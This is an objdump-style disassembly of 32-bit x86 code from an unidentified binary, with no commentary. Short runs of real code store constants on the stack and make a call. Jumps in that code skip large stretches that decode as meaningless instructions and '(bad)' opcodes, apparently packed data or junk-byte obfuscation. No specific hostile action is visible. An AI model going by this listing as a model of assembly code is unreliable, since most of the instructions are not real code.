  40f505:	test   esi,0x9efc6418
  40f50b:	mov    ebx,0x94f4e653
  40f510:	mov    WORD PTR [ebx-0x2ed90472],gs
  40f516:	dec    ebp
  40f517:	cs in  eax,0x64
  40f51a:	xchg   esi,eax
  40f51b:	adc    al,0x76
  40f51d:	scas   al,BYTE PTR es:[edi]
  40f51e:	jmp    0xbe7bde66
  40f523:	in     eax,0xd9
  40f525:	test   al,0x5d
  40f527:	hlt    
  40f528:	cdq    
  40f529:	je     0x40f506
  40f52b:	jle    0x40f4c5
  40f52d:	inc    esp
  40f52e:	lds    ebx,FWORD PTR [esi]
  40f530:	imul   edi,DWORD PTR [ecx-0x2d12ae50],0x3f
  40f537:	scas   eax,DWORD PTR es:[edi]
  40f538:	mov    ecx,0x36f5a01f
  40f53d:	mov    al,0x46
  40f53f:	sbb    esi,esi
  40f541:	push   esp
  40f542:	mov    dl,0xa3
  40f544:	(bad)
  40f548:	and    DWORD PTR [edx+0x31a41fde],esi
  40f54e:	mov    bl,0x55
  40f550:	xor    BYTE PTR [ebp+0x1d6ad05a],0xd3
  40f557:	cs mov bh,0xce
  40f55a:	ds jo  0x40f597
  40f55d:	aaa    
  40f55e:	aam    0x36
  40f560:	mov    esi,gs
  40f562:	mov    ch,0xbe
  40f564:	dec    edi
  40f565:	(bad)  
  40f566:	int    0x4e
  40f568:	call   0x8788:0xaaba8fbe
  40f56f:	nop
  40f570:	hlt    
  40f571:	hlt    
  40f572:	mov    BYTE PTR [ecx],bh
  40f574:	out    0xad,al
  40f576:	cmp    eax,0x54859878
  40f57b:	outs   dx,DWORD PTR ds:[esi]
  40f57c:	mov    bh,0xec
  40f57e:	push   esi
  40f57f:	gs dec edi
  40f581:	das    
  40f582:	mov    edi,0x149029ff
  40f587:	ins    BYTE PTR es:[edi],dx
  40f588:	in     eax,dx
  40f589:	stos   DWORD PTR es:[edi],eax
  40f58a:	loop   0x40f5d6
  40f58c:	xchg   esi,eax
  40f58d:	(bad)  
  40f58e:	popf   
  40f58f:	mov    ah,0x95
  40f591:	xor    esp,DWORD PTR [ebp-0x504109ee]
  40f597:	outs   dx,DWORD PTR ds:[esi]
  40f598:	outs   dx,DWORD PTR ds:[esi]
  40f599:	lahf   
  40f59a:	out    0x15,al
  40f59c:	pop    edx
  40f59d:	push   edi
  40f59e:	mov    DWORD PTR [ebp-0x58],0x3082
  40f5a5:	mov    DWORD PTR [ebp-0x54],0x37a2
  40f5ac:	mov    DWORD PTR [ebp-0x50],0x49d6
  40f5b3:	mov    DWORD PTR [ebp-0x4c],0x6390
  40f5ba:	mov    DWORD PTR [ebp-0x48],0x40f2
  40f5c1:	mov    DWORD PTR [ebp-0x44],0x21d4
  40f5c8:	mov    DWORD PTR [ebp-0x28],0x4726
  40f5cf:	mov    DWORD PTR [ebp-0x24],0x221a
  40f5d6:	mov    DWORD PTR [ebp-0x30],0x768c
  40f5dd:	mov    DWORD PTR [ebp-0x2c],0x29e8
  40f5e4:	mov    DWORD PTR [ebp-0x40],0x6cf6
  40f5eb:	mov    DWORD PTR [ebp-0x3c],0x94c
  40f5f2:	mov    DWORD PTR [ebp-0x38],0x4797
  40f5f9:	mov    DWORD PTR [ebp-0x34],0x4439
  40f600:	mov    DWORD PTR [ebp-0x20],0x2531
  40f607:	mov    esi,0x5a3e
  40f60c:	mov    DWORD PTR [ebp-0x1c],esi
  40f60f:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  40f616:	mov    DWORD PTR [ebp-0x14],0x7
  40f61d:	mov    DWORD PTR [ebp-0x10],0xe3a
  40f624:	mov    DWORD PTR [ebp-0xc],0x6a6e
  40f62b:	mov    DWORD PTR [ebp-0x8],0x6b99
  40f632:	mov    DWORD PTR [ebp-0x4],0x2acd
  40f639:	mov    eax,DWORD PTR [ebp-0x10]
  40f63c:	mov    ecx,DWORD PTR [ebp-0xc]
  40f63f:	mov    eax,DWORD PTR [ebp-0x8]
  40f642:	mov    ecx,DWORD PTR [ebp-0x4]
  40f645:	mov    eax,DWORD PTR [ebp-0x18]
  40f648:	mov    ecx,DWORD PTR [ebp-0x14]
  40f64b:	mov    eax,DWORD PTR [ebp-0x8]
  40f64e:	jmp    0x40fa02
  40f653:	pusha  
  40f654:	and    cl,BYTE PTR [esi]
  40f656:	push   ebp
  40f657:	xchg   esp,eax
  40f658:	jns    0x40f602
  40f65a:	cmp    al,0x86
  40f65c:	aas    
  40f65d:	(bad)  
  40f65f:	pop    ebx
  40f660:	loope  0x40f6cc
  40f662:	rcr    DWORD PTR [eax+0x1e],1
  40f665:	mov    esi,0xbec4e3be
  40f66a:	mov    esi,0xd9756add
  40f66f:	stc    
  40f670:	dec    ebp
  40f671:	cmp    DWORD PTR [edx],ebx
  40f673:	rcl    DWORD PTR [ecx-0x73],1
  40f676:	push   es
  40f677:	push   es
  40f678:	mov    bl,BYTE PTR [esi+ebp*8]
  40f67b:	imul   ebx,edx,0x75c65dee
  40f681:	xchg   DWORD PTR [esi],esi
  40f683:	mov    dl,0x5
  40f685:	clc    
  40f686:	or     eax,0x1b1edd76
  40f68b:	shl    DWORD PTR [edx],1
  40f68d:	mov    edx,0x7f03fee2
  40f692:	stos   BYTE PTR es:[edi],al
  40f693:	mov    esi,0x301f691b
  40f698:	and    eax,0xbb22fec7
  40f69d:	ret    0xbcbb
  40f6a0:	xor    BYTE PTR [edi-0x5d905d04],cl
  40f6a6:	ss pop ebp
  40f6a8:	sbb    cl,bh
  40f6aa:	arpl   ax,dx
  40f6ac:	test   ch,al
  40f6ae:	add    ebx,DWORD PTR [ecx+0xc]
  40f6b1:	dec    esp
  40f6b2:	xchg   edx,eax
  40f6b3:	push   ebp
  40f6b4:	inc    edi
  40f6b5:	pop    edx
  40f6b6:	pop    ebx
  40f6b7:	add    edi,ecx
  40f6b9:	pop    ebx
  40f6ba:	xchg   ecx,eax
  40f6bb:	ret    
  40f6bc:	bound  ecx,QWORD PTR [ecx+ecx*8+0x6e]
  40f6c0:	popa   
  40f6c1:	pop    ds
  40f6c2:	ins    DWORD PTR es:[edi],dx
  40f6c3:	inc    edi
  40f6c4:	outs   dx,DWORD PTR ds:[esi]
  40f6c5:	jb     0x40f6f3
  40f6c7:	inc    esp
  40f6c8:	aam    0xc9
  40f6ca:	les    esi,FWORD PTR [edx+0x2c]
  40f6cd:	add    ch,ch
  40f6cf:	bound  ebx,QWORD PTR [ecx]
  40f6d1:	sbb    edx,ecx
  40f6d3:	popf   
  40f6d4:	in     eax,0x58
  40f6d6:	sub    BYTE PTR [ebx],bh
  40f6d8:	mov    al,ds:0x8c4d8132
  40f6dd:	cmp    bl,dh
  40f6df:	jo     0x40f6cc
  40f6e1:	stos   BYTE PTR es:[edi],al
  40f6e2:	push   esi
  40f6e3:	push   cs
  40f6e4:	(bad)  
  40f6e5:	shl    BYTE PTR [ecx-0x4e],0x32
  40f6e9:	loopne 0x40f67a
  40f6eb:	push   ebp
  40f6ec:	pop    edi
  40f6ed:	call   0xe81886dd
  40f6f2:	push   ebx
  40f6f3:	push   0x5c
  40f6f5:	test   al,0xe4
  40f6f7:	ret    0x39aa
  40f6fa:	fild   QWORD PTR [ebp+0x675b9f2f]
  40f700:	pop    esi
  40f701:	mov    ch,0x60
  40f703:	xor    esp,ecx
  40f705:	push   0x5ef2a28d
  40f70a:	stos   DWORD PTR es:[edi],eax
  40f70b:	add    al,0xd5
  40f70d:	pop    ebp
  40f70e:	mov    esp,0x29849521
  40f713:	frstor [eax+0x1a]
  40f716:	sbb    cl,dl
  40f718:	popf   
  40f719:	into   
  40f71a:	and    bh,dh
  40f71c:	cdq    
  40f71d:	mov    ds:0xd4de3441,eax
  40f722:	pop    ebp
  40f723:	sar    BYTE PTR [ecx],0x46
  40f726:	xchg   edi,eax
  40f727:	cmp    eax,0x51089648
  40f72c:	pop    edx
  40f72d:	sti    
  40f72e:	popa   
  40f72f:	push   ss
  40f730:	xchg   ebp,eax
  40f731:	retf   
  40f732:	mov    esp,0x30365b0e
  40f737:	xchg   ebx,eax
  40f738:	sahf   
  40f739:	or     eax,0xcfb9c0e0
  40f73e:	push   edi
  40f73f:	or     dh,cl
  40f741:	ret    0x2ac1
  40f744:	jle    0x40f793
  40f746:	mov    edi,0x780a930a
  40f74b:	call   0xd89f:0xc8fc857c
  40f752:	test   al,0x9c
  40f754:	mov    dl,0x31
  40f756:	inc    ebx
  40f757:	(bad)  
  40f758:	adc    eax,DWORD PTR [eax]
  40f75a:	dec    esp
  40f75b:	(bad)  
  40f75c:	jbe    0x40f6f6
  40f75e:	fnstsw WORD PTR [ecx+0x6a38d62e]
  40f764:	or     eax,0x8a0b1956
  40f769:	dec    esi
  40f76a:	rcl    DWORD PTR [ebx+edx*4-0x46],1
  40f76e:	sub    al,0x7d
  40f770:	fdiv   st,st(5)
  40f772:	dec    ecx
  40f773:	or     DWORD PTR [ebp+esi*8+0x3eaf03d],ebx
  40f77a:	test   dh,0xe4
  40f77d:	ins    DWORD PTR es:[edi],dx
  40f77e:	cli    
  40f77f:	lock mov edx,0xc70edb70
  40f785:	add    DWORD PTR [edx-0x49b5a5a3],eax
  40f78b:	pop    es
  40f78c:	inc    ecx
  40f78d:	add    BYTE PTR [ebx+0x4c438cab],0x16
  40f794:	cld    
  40f795:	xchg   esi,eax
  40f796:	out    0x3b,eax
  40f798:	dec    esi
  40f799:	inc    esi
  40f79a:	cdq    
  40f79b:	sbb    esp,edi
  40f79d:	int    0x82
  40f79f:	adc    al,0x13
  40f7a1:	mov    edx,0x28c3d709
  40f7a6:	retf   
  40f7a7:	xor    BYTE PTR [ebx-0x6a6072ad],al
  40f7ad:	sbb    dl,BYTE PTR [ebp-0x1cbcb3cb]
  40f7b3:	or     al,0xec
  40f7b5:	add    BYTE PTR [edx-0xe],bh
  40f7b8:	mov    eax,0x31b01c32
  40f7bd:	js     0x40f7f4
  40f7bf:	popa   
  40f7c0:	mov    cl,0xc0
  40f7c2:	sti    
  40f7c3:	cwde   
  40f7c4:	aaa    
  40f7c5:	and    BYTE PTR [ebx+0x55],al
  40f7c8:	outs   dx,DWORD PTR ds:[esi]
  40f7c9:	cmp    eax,0xb7f17b81
  40f7ce:	int3   
  40f7cf:	inc    ebx
  40f7d0:	add    BYTE PTR [eax],cl
  40f7d2:	mov    dh,0xe0
  40f7d4:	push   cs
  40f7d5:	adc    bl,BYTE PTR [edi]
  40f7d7:	mov    al,ds:0xa1d8ebf3
  40f7dc:	mov    dl,0xf4
  40f7de:	xor    BYTE PTR [eax],cl
  40f7e0:	idiv   DWORD PTR ds:0x94f319f6
  40f7e6:	(bad)  
  40f7e7:	mov    bl,0x48
  40f7e9:	int    0x11
  40f7eb:	cmp    DWORD PTR [edx],ecx
  40f7ed:	inc    ebp
  40f7ee:	xor    DWORD PTR ds:[eax],0xffffffc3
  40f7f2:	fsubr  st(0),st
  40f7f4:	rcl    BYTE PTR [eax-0x7e],1
  40f7f7:	loope  0x40f812
  40f7f9:	les    eax,FWORD PTR [eax+esi*8]
  40f7fc:	int    0x11
  40f7fe:	std    
  40f7ff:	mov    edx,0x6893a703
  40f804:	push   eax
  40f805:	push   cs
  40f806:	dec    ebp
  40f807:	or     cl,BYTE PTR [eax+0x4125233f]
  40f80d:	sbb    DWORD PTR [edx],0xffffffec
  40f810:	mov    dl,0xa1
  40f812:	sbb    ah,cl
  40f814:	gs xchg bh,bh
  40f817:	ins    DWORD PTR es:[edi],dx
  40f818:	push   edx
  40f819:	add    BYTE PTR [ebp-0x45c840c8],bh
  40f81f:	cmp    eax,0x8ed73641
  40f824:	shr    BYTE PTR [eax],1
  40f826:	or     al,0x7
  40f828:	or     BYTE PTR [ebx-0x4],cl
  40f82b:	pop    edx
  40f82c:	mov    ds:0xae0da3ea,eax
  40f831:	adc    DWORD PTR [esi+esi*8+0x6395ad9c],eax
  40f838:	mov    al,0x93
  40f83a:	aas    
  40f83b:	lds    edi,FWORD PTR [eax+eiz*4]
  40f83e:	jbe    0x40f8b4
  40f840:	test   eax,0x178ee63a
  40f845:	into   
  40f846:	cmp    BYTE PTR [ebp-0x63b541b3],al
  40f84c:	push   ds
  40f84d:	lods   eax,DWORD PTR ds:[esi]
  40f84e:	mov    esi,0xea5a0949
  40f853:	inc    edx
  40f854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f855:	or     ch,dl
  40f857:	push   eax
  40f858:	and    ch,dh
  40f85a:	jmp    0x40f8c5
  40f85c:	in     al,0xa
  40f85e:	and    edi,esp
  40f860:	aaa    
  40f861:	push   eax
  40f862:	add    al,BYTE PTR [edi+0x2a277c36]
  40f868:	aas    
  40f869:	xchg   ebp,eax
  40f86a:	sbb    esi,DWORD PTR ds:0x3a0136bb
  40f870:	pop    eax
  40f871:	jb     0x40f8a0
  40f873:	adc    DWORD PTR [edx-0x1a],ecx
  40f876:	pop    ebx
  40f877:	mov    ch,dh
  40f879:	jnp    0x40f840
  40f87b:	test   dh,al
  40f87d:	and    dl,bl
  40f87f:	cmc    
  40f880:	mov    eax,ds:0xd57433a4
  40f885:	xchg   ebp,eax
  40f886:	jl     0x40f840
  40f888:	sub    bl,ah
  40f88a:	(bad)
  40f88d:	mov    esp,0x2c88981f
  40f892:	cmp    BYTE PTR [eax],ch
  40f894:	ficomp DWORD PTR [eax]
  40f896:	cmp    ebx,eax
  40f898:	ins    DWORD PTR es:[edi],dx
  40f899:	pop    edx
  40f89a:	int3   
  40f89b:	repnz test al,0x3
  40f89e:	in     al,0x88
  40f8a0:	enter  0xddd7,0x86
  40f8a4:	outs   dx,BYTE PTR ds:[esi]
  40f8a5:	(bad)  
  40f8a6:	(bad)  
  40f8a7:	aad    0xe1
  40f8a9:	daa    
  40f8aa:	pop    ss
  40f8ab:	test   al,0x1f
  40f8ad:	sub    ch,BYTE PTR [esi]
  40f8af:	dec    edx
  40f8b0:	mov    ebx,0x95a64dcf
  40f8b5:	test   ebx,ecx
  40f8b7:	xchg   BYTE PTR [ebx-0x62313552],cl
  40f8bd:	push   es
  40f8be:	jl     0x40f91c
  40f8c0:	test   DWORD PTR ds:0xf3a07f6c,esp
  40f8c6:	mov    DWORD PTR [eax+esi*8+0xc],edx
  40f8ca:	addr16 jp 0x40f889
  40f8cd:	add    esp,DWORD PTR [edx+esi*8]
  40f8d0:	mov    ch,0xfd
  40f8d2:	adc    eax,DWORD PTR cs:[ecx+0x1]
  40f8d6:	jne    0x40f92a
  40f8d8:	bound  esi,QWORD PTR [eax+ecx*8+0x694a649a]
  40f8df:	pop    eax
  40f8e0:	cmp    dl,BYTE PTR [esi+0x7e]
  40f8e3:	push   eax
  40f8e4:	sbb    BYTE PTR [eax+0x1ebc409f],dh
  40f8ea:	nop
  40f8eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8ec:	adc    BYTE PTR [esi-0x18d6590f],bl
  40f8f2:	push   0x81c51ee2
  40f8f7:	mov    eax,ds:0x53e90e44
  40f8fc:	mov    dh,0xbe
  40f8fe:	sbb    BYTE PTR [ebp-0x3],dh
  40f901:	jmp    0x4280:0x8ba9e9a9
  40f908:	cmp    eax,0x94872e94
  40f90d:	cld    
  40f90e:	inc    esi
  40f90f:	dec    esi
  40f910:	inc    ebx
  40f911:	mov    dl,BYTE PTR [ebp-0x48]
  40f914:	push   ds
  40f915:	div    BYTE PTR [esi-0xb8c3be1]
  40f91b:	btc    DWORD PTR [esi+edi*1-0x2a],esp
  40f920:	(bad)  fs:[eax-0x28dcce8b]
  40f927:	xor    eax,DWORD PTR [ebx+0x6e52de63]
  40f92d:	dec    ebx
  40f92e:	cmp    edx,DWORD PTR [ebp-0x3e67e57d]
  40f934:	(bad)  
  40f935:	pop    eax
  40f936:	in     eax,0x96
  40f938:	or     edx,DWORD PTR [ecx+0x3d]
  40f93b:	push   ecx
  40f93c:	fld    QWORD PTR [ebx]
  40f93e:	mov    edx,0xc2161ae
  40f943:	xchg   edi,eax
  40f944:	mov    ebp,0x532a5072
  40f949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f94a:	scas   eax,DWORD PTR es:[edi]
  40f94b:	cmp    DWORD PTR [ebx+0x34bcf22e],ecx
  40f951:	jecxz  0x40f98f
  40f953:	and    ebx,DWORD PTR [edx+0x2f]
  40f956:	pop    ebx
  40f957:	mov    ds:0xd5f50c49,al
  40f95c:	retf   
  40f95d:	repz pop esi
  40f95f:	and    ah,BYTE PTR [esi-0x7c]
  40f962:	test   edx,ebx
  40f964:	stos   DWORD PTR es:[edi],eax
  40f965:	push   ecx
  40f966:	fld    QWORD PTR [esi]
  40f968:	jbe    0x40f940
  40f96a:	scas   al,BYTE PTR es:[edi]
  40f96b:	adc    eax,0x391dde36
  40f970:	(bad)  
  40f971:	icebp  
  40f972:	inc    edx
  40f973:	dec    esp
  40f974:	into   
  40f975:	push   ss
  40f976:	or     esp,DWORD PTR ds:0x9d1a7828
  40f97c:	adc    DWORD PTR [esi-0x51],edx
  40f97f:	pop    es
  40f980:	mov    WORD PTR [edx+ebp*2+0x7d],ds
  40f984:	test   DWORD PTR [esi+edx*4-0x15],eax
  40f988:	pop    ebp
  40f989:	in     eax,0x70
  40f98b:	inc    ecx
  40f98c:	sub    edi,DWORD PTR [edi]
  40f98e:	push   es
  40f98f:	jecxz  0x40f941
  40f991:	int3   
  40f992:	(bad)  [esi+ebp*2+0x64f6143d]
  40f999:	xor    al,0x3a
  40f99b:	sbb    DWORD PTR [edi+0x32448f70],0xffffff9f
  40f9a2:	push   edi
  40f9a3:	shr    ah,cl
  40f9a5:	pop    edi
  40f9a6:	out    0x71,al
  40f9a8:	mov    dl,0xde
  40f9aa:	test   al,0x16
  40f9ac:	cmp    eax,0xbb78dbf1
  40f9b1:	mov    gs,WORD PTR [ecx+0x29]
  40f9b4:	or     bh,BYTE PTR [ebx-0x74]
  40f9b7:	sub    DWORD PTR [ebx],ecx
  40f9b9:	xor    edi,DWORD PTR [ebp+eax*8-0x22d84b3d]
  40f9c0:	sub    eax,0x6602379f
  40f9c5:	sub    eax,0xee2306e1
  40f9ca:	outs   dx,DWORD PTR ds:[esi]
  40f9cb:	daa    
  40f9cc:	push   es
  40f9cd:	xchg   esp,eax
  40f9ce:	mov    esi,0x1e7d2f95
  40f9d3:	and    BYTE PTR [edi+0x26],al
  40f9d6:	repz popf 
  40f9d8:	or     DWORD PTR [edi],eax
  40f9da:	adc    dh,BYTE PTR [eax]
  40f9dc:	xor    al,0x39
  40f9de:	retf   
  40f9df:	xchg   edi,eax
  40f9e0:	pop    es
  40f9e1:	push   edi
  40f9e2:	popf   
  40f9e3:	mov    bh,0xc
  40f9e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9e6:	jae    0x40f9de
  40f9e8:	lods   al,BYTE PTR ds:[esi]
  40f9e9:	inc    eax
  40f9ea:	mov    ds:0xac62ed05,eax
  40f9ef:	and    edx,DWORD PTR [esi]
  40f9f1:	adc    al,0xf2
  40f9f3:	jne    0x40fa4b
  40f9f5:	xor    eax,0x1e0a33c1
  40f9fa:	add    DWORD PTR [esi],0x41ec6ffd
  40fa00:	pop    es
  40fa01:	iret   
  40fa02:	mov    ecx,DWORD PTR [ebp-0x4]
  40fa05:	mov    edx,DWORD PTR [ebp-0x10]
  40fa08:	mov    edi,DWORD PTR [ebp-0xc]
  40fa0b:	add    eax,edx
  40fa0d:	mov    edx,DWORD PTR [ebp-0x18]
  40fa10:	adc    ecx,edi
  40fa12:	mov    edi,DWORD PTR [ebp-0x14]
  40fa15:	push   edi
  40fa16:	push   edx
  40fa17:	or     ecx,0x6833
  40fa1d:	or     eax,0x6b80
  40fa22:	push   ecx
  40fa23:	push   eax
  40fa24:	call   0x422283
  40fa29:	mov    ecx,DWORD PTR [ebp-0x20]
  40fa2c:	mov    edi,DWORD PTR [ebp-0x1c]
  40fa2f:	and    eax,0x25cb
  40fa34:	jmp    0x40fde8
  40fa39:	js     0x40fa83
  40fa3b:	cld    
  40fa3c:	(bad)  
  40fa3e:	jb     0x40fabc
  40fa40:	pop    eax
  40fa41:	dec    eax
  40fa42:	lods   eax,DWORD PTR ds:[esi]
  40fa43:	push   cs
  40fa44:	sahf   
  40fa45:	dec    esp
  40fa46:	mov    WORD PTR [esi-0x62],ds
  40fa49:	jge    0x40fa71
  40fa4b:	mov    esi,0xbec4e3be
  40fa50:	mov    esi,0x8947be20
  40fa55:	mov    DWORD PTR [ecx],ebx
  40fa57:	leave  
  40fa58:	mov    ebx,0x37941077
  40fa5d:	outs   dx,DWORD PTR ds:[esi]
  40fa5e:	fwait
  40fa5f:	jl     0x40fa0e
  40fa61:	dec    DWORD PTR [esi-0x56]
  40fa64:	adc    eax,0x178eb590
  40fa69:	pop    edi
  40fa6a:	adc    eax,0x6e975f32
  40fa6f:	mov    ah,BYTE PTR gs:[ecx+0x72]
  40fa73:	lahf   
  40fa74:	mov    cl,BYTE PTR [edi]
  40fa76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa77:	jnp    0x40fa18
  40fa79:	loop   0x40fae8
  40fa7b:	outs   dx,BYTE PTR ds:[esi]
  40fa7c:	ret    
  40fa7d:	mov    ecx,0xb0e2740e
  40fa82:	les    eax,FWORD PTR [edi+ebx*1-0x76]
  40fa86:	sbb    eax,0xa083dc22
  40fa8b:	push   esp
  40fa8c:	mov    es,WORD PTR [eax-0x69]
  40fa8f:	loope  0x40fa21
  40fa91:	or     al,dl
  40fa93:	ins    DWORD PTR es:[edi],dx
  40fa94:	shl    BYTE PTR [edi+ebp*2+0x48],cl
  40fa98:	popf   
  40fa99:	retf   0x8247
  40fa9c:	lds    ebx,FWORD PTR [edi-0x4]
  40fa9f:	sbb    edi,esp
  40faa1:	pop    esi
  40faa2:	inc    esi
  40faa3:	bound  eax,QWORD PTR [ebp-0x11]
  40faa6:	mov    dh,0xef
  40faa8:	div    bl
  40faaa:	(bad)  
  40faab:	sbb    BYTE PTR [ecx+0x53],bh
  40faae:	jnp    0x40fa7d
  40fab0:	push   0x79a66bcf
  40fab5:	outs   dx,BYTE PTR ds:[esi]
  40fab6:	rcl    DWORD PTR [ecx+0x27],0xeb
  40faba:	jmp    0x34b750f8
  40fabf:	xchg   ebx,eax
  40fac0:	daa    
  40fac1:	bound  esi,QWORD PTR [ebx+0x653851b2]
  40fac7:	jp     0x40fad3
  40fac9:	leave  
  40faca:	mov    BYTE PTR [edi],al
  40facc:	jns    0x40fa8f
  40face:	ret    0x3f2c
  40fad1:	xchg   ebp,eax
  40fad2:	fcmovnbe st,st(7)
  40fad4:	and    esp,DWORD PTR [eax]
  40fad6:	xor    ah,BYTE PTR [eax]
  40fad8:	dec    eax
  40fad9:	dec    ebp
  40fada:	ds pop es
  40fadc:	mov    ah,0x76
  40fade:	pop    eax
  40fadf:	xlat   BYTE PTR ds:[ebx]
  40fae0:	push   esi
  40fae1:	fwait
  40fae2:	test   ch,cl
  40fae4:	call   0x86ab:0x7e0600a4
  40faeb:	addr16 pushf 
  40faed:	aam    0x5
  40faef:	outs   dx,BYTE PTR ds:[esi]
  40faf0:	sub    edi,DWORD PTR [edi+0x11649c87]
  40faf6:	and    bh,ch
  40faf8:	nop
  40faf9:	xchg   esi,eax
  40fafa:	jmp    0x5c9a7bda
  40faff:	xchg   eax,esp
  40fb01:	out    0x4d,eax
  40fb03:	div    BYTE PTR [edx+0x67]
  40fb06:	push   ds
  40fb07:	mov    ah,ch
  40fb09:	out    dx,al
  40fb0a:	das    
  40fb0b:	jmp    0xbfc2:0xd6f3a482
  40fb12:	cs in  eax,dx
  40fb14:	imul   eax,esp,0x1f
  40fb17:	pop    ebp
  40fb18:	mov    ebp,0x27652aa
  40fb1d:	sti    
  40fb1e:	xchg   edx,eax
  40fb1f:	push   cs
  40fb20:	dec    eax
  40fb21:	(bad)  
  40fb22:	jo     0x40fab8
  40fb24:	out    0x5f,eax
  40fb26:	inc    edi
  40fb27:	push   ss
  40fb28:	mov    cl,0x5d
  40fb2a:	xchg   BYTE PTR [ebx-0x7f],cl
  40fb2d:	call   0xa6d1feb7
  40fb32:	xor    eax,0xa7b4b02f
  40fb37:	sbb    DWORD PTR es:[esi],0x2e
  40fb3b:	inc    ebx
  40fb3c:	fwait
  40fb3d:	push   edx
  40fb3e:	out    0xc9,al
  40fb40:	mov    BYTE PTR ds:0x65e52bb3,bh
  40fb46:	in     eax,dx
  40fb47:	(bad)  
  40fb48:	aam    0x9c
  40fb4a:	lds    esi,FWORD PTR [ecx]
  40fb4c:	pop    edi
  40fb4d:	jg     0x40fb9a
  40fb4f:	mov    al,BYTE PTR ss:[edi]
  40fb52:	in     eax,dx
  40fb53:	stos   DWORD PTR es:[edi],eax
  40fb54:	or     BYTE PTR ds:0x6c03d630,cl
  40fb5a:	mov    ebp,0xa253dc7
  40fb5f:	jle    0x40fb74
  40fb61:	or     eax,0x19136ab6
  40fb66:	jo     0x40fba7
  40fb68:	dec    esp
  40fb69:	xor    bl,BYTE PTR [eax-0x4d8a0678]
  40fb6f:	fdiv   st,st(2)
  40fb71:	mov    edi,0xce671d9d
  40fb76:	scas   eax,DWORD PTR es:[edi]
  40fb77:	jae    0x40fbcf
  40fb79:	adc    BYTE PTR [edx-0x42],al
  40fb7c:	jge    0x40fb42
  40fb7e:	xchg   esp,eax
  40fb7f:	(bad)  
  40fb80:	in     al,0x91
  40fb82:	or     BYTE PTR [esi-0x18],cl
  40fb85:	fld    QWORD PTR [ecx+0x3b]
  40fb88:	push   0x2
  40fb8a:	out    0x81,eax
  40fb8c:	xlat   BYTE PTR ds:[ebx]
  40fb8d:	push   ebp
  40fb8e:	inc    edi
  40fb8f:	mov    ah,0x25
  40fb91:	ds pop edx
  40fb93:	pop    eax
  40fb94:	sar    DWORD PTR [ebx+0x33b8360a],0x8b
  40fb9b:	and    eax,0xf6f51d5d
  40fba0:	or     ebp,ebx
  40fba2:	stos   DWORD PTR es:[edi],eax
  40fba3:	xor    esp,esi
  40fba5:	cmc    
  40fba6:	in     al,dx
  40fba7:	adc    dh,dh
  40fba9:	nop
  40fbaa:	icebp  
  40fbab:	aaa    
  40fbac:	pop    esp
  40fbad:	retf   0x484b
  40fbb0:	pop    esi
  40fbb1:	mov    al,0xd6
  40fbb3:	pop    edx
  40fbb4:	xor    eax,0x39b8e36d
  40fbb9:	fistp  WORD PTR ds:0x2e79a9d7
  40fbbf:	pop    edi
  40fbc0:	addr16 daa 
  40fbc2:	mov    al,ds:0x7a8a1dbd
  40fbc7:	mov    ebp,ss
  40fbc9:	ret    
  40fbca:	or     ecx,DWORD PTR ds:0xcab77ad4
  40fbd0:	adc    bh,BYTE PTR [eax]
  40fbd2:	ins    BYTE PTR es:[edi],dx
  40fbd3:	fistp  QWORD PTR [edx+0x6b]
  40fbd6:	shl    BYTE PTR [esi],0xb8
  40fbd9:	(bad)  
  40fbda:	sub    BYTE PTR [eax],al
  40fbdc:	push   0xf41f72e9
  40fbe1:	jp     0x40fbb3
  40fbe3:	pop    ebx
  40fbe4:	std    
  40fbe5:	xchg   edx,eax
  40fbe6:	nop
  40fbe7:	lds    esi,FWORD PTR gs:[eax+ecx*1]
  40fbeb:	mov    ds:0x9e7cc4ab,al
  40fbf0:	adc    dl,cl
  40fbf2:	(bad)  
  40fbf3:	mov    dh,0xc0
  40fbf5:	test   al,0x8e
  40fbf7:	les    ebx,FWORD PTR [ebx+0x1d899c75]
  40fbfd:	imul   eax,DWORD PTR [eax],0xf2d9bd4b
  40fc03:	dec    ebx
  40fc04:	arpl   di,bp
  40fc06:	inc    esp
  40fc07:	lds    ebp,FWORD PTR [edi-0x5e7addc2]
  40fc0d:	in     al,dx
  40fc0e:	rcr    BYTE PTR [edi+0x4f9a57],cl
  40fc14:	mov    al,ds:0x19a86907
  40fc19:	jo     0x40fbb7
  40fc1b:	cld    
  40fc1c:	or     bl,BYTE PTR [ecx+0x3de3e3b2]
  40fc22:	aam    0xec
  40fc24:	or     ebp,DWORD PTR [edi]
  40fc26:	ss popa 
  40fc28:	mov    ebp,gs
  40fc2a:	addr16 push esp
  40fc2c:	mov    dl,0xc1
  40fc2e:	push   esi
  40fc2f:	cli    
  40fc30:	call   FWORD PTR [ebx]
  40fc32:	push   cs
  40fc33:	imul   eax,DWORD PTR [ebp-0x3cb73f30],0xffffffd1
  40fc3a:	sbb    BYTE PTR [edx+0x13],ch
  40fc3d:	xlat   BYTE PTR ds:[ebx]
  40fc3e:	fsub   DWORD PTR [edi-0x42]
  40fc41:	out    dx,al
  40fc42:	dec    esp
  40fc43:	pop    esi
  40fc44:	outs   dx,BYTE PTR ds:[esi]
  40fc45:	in     al,0xf7
  40fc47:	xor    al,BYTE PTR [edx+0x2a]
  40fc4a:	clc    
  40fc4b:	sub    dh,dh
  40fc4d:	cmp    ch,BYTE PTR [edx]
  40fc4f:	in     al,dx
  40fc50:	imul   bp,ax,0xce45
  40fc55:	dec    edi
  40fc56:	imul   edi,DWORD PTR [ecx+eiz*2+0x3e4dbd85],0x53e47a69
  40fc61:	sbb    eax,0xfe7bde7a
  40fc66:	sbb    BYTE PTR [ecx],bl
  40fc68:	das    
  40fc69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc6a:	push   es
  40fc6b:	retf   
  40fc6c:	cwde   
  40fc6d:	jmp    0xb6c3:0x76f30358
  40fc74:	and    dl,ch
  40fc76:	mov    bh,0xea
  40fc78:	add    edx,edi
  40fc7a:	hlt    
  40fc7b:	loopne 0x40fc69
  40fc7d:	add    eax,0x1e35453d
  40fc82:	inc    esi
  40fc83:	jmp    0xeeb9875e
  40fc88:	mov    dh,0x36
  40fc8a:	es jecxz 0x40fc38
  40fc8d:	aas    
  40fc8e:	stos   DWORD PTR es:[edi],eax
